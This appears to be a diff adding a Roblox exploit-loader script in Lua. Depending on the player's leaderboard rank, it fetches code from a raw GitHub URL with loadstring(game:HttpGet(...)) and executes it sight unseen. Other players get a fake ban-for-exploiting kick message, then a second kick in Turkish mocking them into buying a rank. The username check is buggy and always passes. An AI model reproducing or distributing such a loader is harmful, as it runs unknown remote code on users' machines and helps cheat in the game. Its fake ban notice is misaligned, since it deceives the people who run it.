@@ -1,0 +1,62 @@
+local coregui = game:service"CoreGui"
+
+local music = Instance.new("Sound", coregui)
+
+music.SoundId = "rbxassetid://7067700233"
+
+music.Volume = 7
+
+music.Looped = false
+
+
+
+
+
+wait(3)
+
+if game.Players.LocalPlayer.Name == "zattirizortzort3133" or "samibabaproking" then
+
+print("hehehe")
+
+local old = game.Players.LocalPlayer.leaderstats.Rank
+
+if old.Value == "MAX-3" then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ienxjxuifjff/Jsjxjcifjfbbfdbfhdgg/main/Gdbhg"))()
+
+elseif old.Value =="MAX-4" then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ienxjxuifjff/Jsjxjcifjfbbfdbfhdgg/main/Gdbhg"))()
+
+elseif old.Value == "MAX-5" then 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ienxjxuifjff/Jsjxjcifjfbbfdbfhdgg/main/Gdbhg"))()
+
+elseif old.Value == "MAX-6" then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ienxjxuifjff/Jsjxjcifjfbbfdbfhdgg/main/Gdbhg"))()
+
+elseif old.Value == "MAX-7" then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ienxjxuifjff/Jsjxjcifjfbbfdbfhdgg/main/Gdbhg"))()
+
+else
+
+
+
+game.Players.LocalPlayer:Kick("You have been banned for using In-Game(Cheating, Exploiting etc.). If you think this is a mistake, please head over to the support channel.")
+
+wait (2.8)
+
+music:Play()
+
+wait(1)
+
+game.Players.LocalPlayer:Kick("Şaka şaka, 5 rank yeter mk git satın al 💀")
+
+end
+
+
+
+end
+
